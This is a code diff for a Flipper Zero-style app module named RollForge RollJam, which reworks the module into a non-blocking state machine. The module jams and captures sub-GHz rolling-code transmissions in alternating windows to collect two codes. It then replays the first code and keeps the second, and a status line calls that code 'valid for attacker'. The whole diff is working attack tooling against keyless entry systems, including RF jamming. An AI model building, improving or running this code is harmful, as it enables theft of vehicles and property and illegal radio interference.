@@ -1,14 +1,16 @@
-// module_rolljam.c — RollJam phase engine for RollForge
+// module_rolljam.c — RollJam non-blocking state machine for RollForge
 #include "module_rolljam.h"
 #include <gui/canvas.h>
 #include <lib/subghz/devices/devices.h>
 #include <lib/toolbox/level_duration.h>
 #include <notification/notification_messages.h>
 
-// Interrupt-accessible globals
-static volatile bool      s_jam    = false;
-static volatile RfSig*    s_cap    = NULL;
-static volatile RollForgeApp* s_rep = NULL;
+#define RJ_JAM_MS  180U
+#define RJ_RX_MS    80U
+
+static volatile bool           s_jam  = false;
+static volatile RfSig*         s_cap  = NULL;
+static volatile RollForgeApp*  s_rep  = NULL;
 
 // ---------------------------------------------------------------------------
 // Interrupt callbacks
@@ -46,9 +48,10 @@ static LevelDuration rj_replay_cb(void* ctx) {
 }
 
 // ---------------------------------------------------------------------------
-// RF helpers (local — use shared device from app)
+// RF helpers — all guard app->device
 // ---------------------------------------------------------------------------
 static void rj_jam_start(RollForgeApp* app) {
+    if(!app->device) return;
     s_jam = true;
     subghz_devices_idle(app->device);
     subghz_devices_start_async_tx(app->device, rj_jam_cb, NULL);
@@ -57,12 +60,14 @@ static void rj_jam_start(RollForgeApp* app) {
 
 static void rj_jam_stop(RollForgeApp* app) {
     s_jam = false;
+    if(!app->device) return;
     subghz_devices_stop_async_tx(app->device);
     subghz_devices_idle(app->device);
     app->rf_op = RF_IDLE;
 }
 
 static void rj_cap_start(RollForgeApp* app, RfSig* sig) {
+    if(!app->device) return;
     sig->count = 0; sig->ready = false;
     s_cap = sig;
     subghz_devices_idle(app->device);
@@ -71,46 +76,31 @@ static void rj_cap_start(RollForgeApp* app, RfSig* sig) {
 }
 
 static void rj_cap_stop(RollForgeApp* app) {
+    if(!app->device) { s_cap = NULL; return; }
     subghz_devices_stop_async_rx(app->device);
     s_cap = NULL;
     subghz_devices_idle(app->device);
     app->rf_op = RF_IDLE;
 }
 
-static void rj_cleanup_rf(RollForgeApp* app) {
+static void rj_rf_clean(RollForgeApp* app) {
     s_jam = false; s_cap = NULL; s_rep = NULL;
+    if(!app->device) return;
     subghz_devices_stop_async_tx(app->device);
     subghz_devices_stop_async_rx(app->device);
     subghz_devices_idle(app->device);
     app->rf_op = RF_IDLE;
 }
 
-// Interlaced jam+capture — blocks, polls abort + event queue
-static bool rj_jam_capture(RollForgeApp* app, RfSig* sig, const char* label) {
-    uint32_t start = furi_get_tick();
+// ---------------------------------------------------------------------------
+// Non-blocking interlaced jam/rx helper — starts the first jam window
+// ---------------------------------------------------------------------------
+static void rj_phase_start(RollForgeApp* app, RfSig* sig, RjPhase jam_state) {
     sig->count = 0; sig->ready = false;
-    while(!app->abort && (furi_get_tick() - start) < RF_TIMEOUT_MS) {
-        snprintf(app->rj.status, sizeof(app->rj.status), "%s jam...", label);
-        rj_jam_start(app);
-        uint32_t t = furi_get_tick() + 180;
-        while(furi_get_tick() < t && !app->abort) furi_delay_ms(5);
-        rj_jam_stop(app);
-
-        snprintf(app->rj.status, sizeof(app->rj.status), "%s RX...", label);
-        rj_cap_start(app, sig);
-        t = furi_get_tick() + 80;
-        while(furi_get_tick() < t && !sig->ready && !app->abort) furi_delay_ms(5);
-        rj_cap_stop(app);
-
-        view_port_update(app->vp);
-
-        InputEvent ev;
-        while(furi_message_queue_get(app->eq, &ev, 0) == FuriStatusOk)
-            if(ev.key == InputKeyBack && ev.type == InputTypeShort) app->abort = true;
-
-        if(sig->ready && sig->count >= RF_MIN_EDGES) return true;
-    }
-    return false;
+    app->rj.phase_start_ms = furi_get_tick();
+    app->rj.step_start_ms  = app->rj.phase_start_ms;
+    app->rj.phase = jam_state;
+    rj_jam_start(app);
 }
 
 // ---------------------------------------------------------------------------
@@ -118,24 +108,28 @@ static bool rj_jam_capture(RollForgeApp* app, RfSig* sig, const char* label) {
 // ---------------------------------------------------------------------------
 void rj_enter(RollForgeApp* app) {
     app->rj.phase = RJ_IDLE;
-    snprintf(app->rj.status, sizeof(app->rj.status), "[OK] Start  [Back] Exit");
+    snprintf(app->rj.status, sizeof(app->rj.status), "[OK] Start  [Back] Menu");
 }
 
 void rj_exit(RollForgeApp* app) {
-    rj_cleanup_rf(app);
+    rj_rf_clean(app);
     app->rj.phase = RJ_IDLE;
 }
 
 void rj_input(RollForgeApp* app, InputEvent* ev) {
     if(ev->type != InputTypeShort) return;
     ModRollJam* m = &app->rj;
-    if(ev->key == InputKeyOk && m->phase == RJ_IDLE) {
-        m->phase = RJ_PHASE1;
-    } else if(ev->key == InputKeyOk && m->phase == RJ_CAPTURED) {
-        m->phase = RJ_PHASE2;
-    } else if(ev->key == InputKeyOk && m->phase == RJ_DONE) {
-        m->phase = RJ_IDLE;
-        snprintf(m->status, sizeof(m->status), "[OK] Start  [Back] Exit");
+    if(ev->key == InputKeyOk) {
+        if(m->phase == RJ_IDLE) {
+            snprintf(m->status, sizeof(m->status), "Phase 1: Jam+Capture A...");
+            rj_phase_start(app, &m->sig_a, RJ_P1_JAM);
+        } else if(m->phase == RJ_CAPTURED) {
+            snprintf(m->status, sizeof(m->status), "Phase 2: Jam+Capture B...");
+            rj_phase_start(app, &m->sig_b, RJ_P2_JAM);
+        } else if(m->phase == RJ_DONE) {
+            m->phase = RJ_IDLE;
+            snprintf(m->status, sizeof(m->status), "[OK] Start  [Back] Menu");
+        }
     }
 }
 
@@ -145,55 +139,101 @@ void rj_tick(RollForgeApp* app) {
         snprintf(m->status, sizeof(m->status), "ERR: No CC1101");
         return;
     }
+
+    uint32_t now = furi_get_tick();
+
     switch(m->phase) {
     case RJ_IDLE:
+    case RJ_CAPTURED:
     case RJ_DONE:
         break;
 
-    case RJ_PHASE1: {
-        bool ok = rj_jam_capture(app, &m->sig_a, "Ph1");
-        if(app->abort) { m->phase = RJ_IDLE; rj_cleanup_rf(app);
-            snprintf(m->status, sizeof(m->status), "Aborted"); app->abort = false; break; }
-        if(ok) {
-            snprintf(m->status, sizeof(m->status), "A: %u edges — [OK] Ph2", (unsigned)m->sig_a.count);
-            m->phase = RJ_CAPTURED;
-        } else {
-            snprintf(m->status, sizeof(m->status), "Ph1 Timeout");
+    // ----- Phase 1 jam window -----
+    case RJ_P1_JAM:
+        if(now - m->phase_start_ms >= RF_TIMEOUT_MS) {
+            rj_jam_stop(app);
             m->phase = RJ_IDLE;
+            snprintf(m->status, sizeof(m->status), "Phase 1 Timeout");
+        } else if(now - m->step_start_ms >= RJ_JAM_MS) {
+            rj_jam_stop(app);
+            rj_cap_start(app, &m->sig_a);
+            m->step_start_ms = now;
+            m->phase = RJ_P1_RX;
+            snprintf(m->status, sizeof(m->status), "Ph1 RX...");
         }
         break;
-    }
 
-    case RJ_CAPTURED:
+    // ----- Phase 1 RX window -----
+    case RJ_P1_RX:
+        if(m->sig_a.ready && m->sig_a.count >= RF_MIN_EDGES) {
+            rj_cap_stop(app);
+            snprintf(m->status, sizeof(m->status), "A: %lu edges -- [OK] Ph2", (unsigned long)m->sig_a.count);
+            m->phase = RJ_CAPTURED;
+            notification_message(app->notif, &sequence_success);
+        } else if(now - m->step_start_ms >= RJ_RX_MS) {
+            rj_cap_stop(app);
+            if(now - m->phase_start_ms >= RF_TIMEOUT_MS) {
+                m->phase = RJ_IDLE;
+                snprintf(m->status, sizeof(m->status), "Phase 1 Timeout");
+            } else {
+                rj_jam_start(app);
+                m->step_start_ms = now;
+                m->phase = RJ_P1_JAM;
+                snprintf(m->status, sizeof(m->status), "Ph1 Jam...");
+            }
+        }
         break;
 
-    case RJ_PHASE2: {
-        bool ok = rj_jam_capture(app, &m->sig_b, "Ph2");
-        if(app->abort) { m->phase = RJ_IDLE; rj_cleanup_rf(app);
-            snprintf(m->status, sizeof(m->status), "Aborted"); app->abort = false; break; }
-        if(ok) {
-            snprintf(m->status, sizeof(m->status), "B: %u — Replaying A...", (unsigned)m->sig_b.count);
+    // ----- Phase 2 jam window -----
+    case RJ_P2_JAM:
+        if(now - m->phase_start_ms >= RF_TIMEOUT_MS) {
+            rj_jam_stop(app);
+            m->phase = RJ_IDLE;
+            snprintf(m->status, sizeof(m->status), "Phase 2 Timeout");
+        } else if(now - m->step_start_ms >= RJ_JAM_MS) {
+            rj_jam_stop(app);
+            rj_cap_start(app, &m->sig_b);
+            m->step_start_ms = now;
+            m->phase = RJ_P2_RX;
+            snprintf(m->status, sizeof(m->status), "Ph2 RX...");
+        }
+        break;
+
+    // ----- Phase 2 RX window -----
+    case RJ_P2_RX:
+        if(m->sig_b.ready && m->sig_b.count >= RF_MIN_EDGES) {
+            rj_cap_stop(app);
+            // Immediately start replay
             m->tx_pos = 0; s_rep = app;
             subghz_devices_idle(app->device);
             subghz_devices_start_async_tx(app->device, rj_replay_cb, NULL);
             app->rf_op = RF_REPLAYING;
             m->phase = RJ_REPLAY;
-        } else {
-            snprintf(m->status, sizeof(m->status), "Ph2 Timeout");
-            m->phase = RJ_IDLE;
+            snprintf(m->status, sizeof(m->status), "Replaying A... (B saved)");
+        } else if(now - m->step_start_ms >= RJ_RX_MS) {
+            rj_cap_stop(app);
+            if(now - m->phase_start_ms >= RF_TIMEOUT_MS) {
+                m->phase = RJ_IDLE;
+                snprintf(m->status, sizeof(m->status), "Phase 2 Timeout");
+            } else {
+                rj_jam_start(app);
+                m->step_start_ms = now;
+                m->phase = RJ_P2_JAM;
+                snprintf(m->status, sizeof(m->status), "Ph2 Jam...");
+            }
         }
         break;
-    }
 
+    // ----- Replay -----
     case RJ_REPLAY: {
         bool done = (m->tx_pos >= m->sig_a.count) ||
                     subghz_devices_is_async_complete_tx(app->device);
-        if(done || app->abort) {
+        if(done) {
             s_rep = NULL;
             subghz_devices_stop_async_tx(app->device);
             subghz_devices_idle(app->device);
-            app->rf_op = RF_IDLE; app->abort = false;
-            snprintf(m->status, sizeof(m->status), "Done! B valid for attacker.");
+            app->rf_op = RF_IDLE;
+            snprintf(m->status, sizeof(m->status), "Done! B valid. [OK] Again");
             m->phase = RJ_DONE;
             notification_message(app->notif, &sequence_success);
         }
@@ -204,29 +244,36 @@ void rj_tick(RollForgeApp* app) {
 
 void rj_draw(Canvas* canvas, RollForgeApp* app) {
     ModRollJam* m = &app->rj;
+    static const char* phase_labels[] = {
+        "IDLE", "PH1:JAM", "PH1:RX", "CAPTURED", "PH2:JAM", "PH2:RX", "REPLAY", "DONE"
+    };
+
     canvas_set_font(canvas, FontPrimary);
     canvas_draw_str(canvas, 0, 10, "RollForge > RollJam");
     canvas_draw_line(canvas, 0, 12, 127, 12);
-
-    static const char* phase_labels[] = {
-        "IDLE", "PHASE 1", "CAPTURED", "PHASE 2", "REPLAYING", "DONE"
-    };
     canvas_set_font(canvas, FontSecondary);
-    canvas_draw_str(canvas, 0, 24, phase_labels[m->phase]);
-    canvas_draw_str_aligned(canvas, 127, 24, AlignRight, AlignTop,
-        app->rf_op == RF_JAMMING   ? "[JAM]"  :
-        app->rf_op == RF_CAPTURING ? "[RX]"   :
-        app->rf_op == RF_REPLAYING ? "[TX]"   : "");
 
-    canvas_draw_str(canvas, 0, 37, app->rj.status);
+    uint8_t pi = (uint8_t)m->phase;
+    if(pi < 8) canvas_draw_str(canvas, 0, 24, phase_labels[pi]);
+
+    if(app->rf_op == RF_JAMMING)
+        canvas_draw_str_aligned(canvas, 127, 24, AlignRight, AlignTop, "[JAM]");
+    else if(app->rf_op == RF_CAPTURING)
+        canvas_draw_str_aligned(canvas, 127, 24, AlignRight, AlignTop, "[RX]");
+    else if(app->rf_op == RF_REPLAYING)
+        canvas_draw_str_aligned(canvas, 127, 24, AlignRight, AlignTop, "[TX]");
+
+    canvas_draw_str(canvas, 0, 37, m->status);
 
     if(m->phase == RJ_REPLAY) {
         char buf[32];
-        snprintf(buf, sizeof(buf), "TX %u/%u", (unsigned)m->tx_pos, (unsigned)m->sig_a.count);
+        snprintf(buf, sizeof(buf), "TX %lu/%lu",
+            (unsigned long)m->tx_pos, (unsigned long)m->sig_a.count);
         canvas_draw_str(canvas, 0, 50, buf);
     } else if(m->phase == RJ_CAPTURED || m->phase == RJ_DONE) {
         char buf[48];
-        snprintf(buf, sizeof(buf), "A:%u  B:%u", (unsigned)m->sig_a.count, (unsigned)m->sig_b.count);
+        snprintf(buf, sizeof(buf), "A:%lu  B:%lu",
+            (unsigned long)m->sig_a.count, (unsigned long)m->sig_b.count);
         canvas_draw_str(canvas, 0, 50, buf);
     }
 
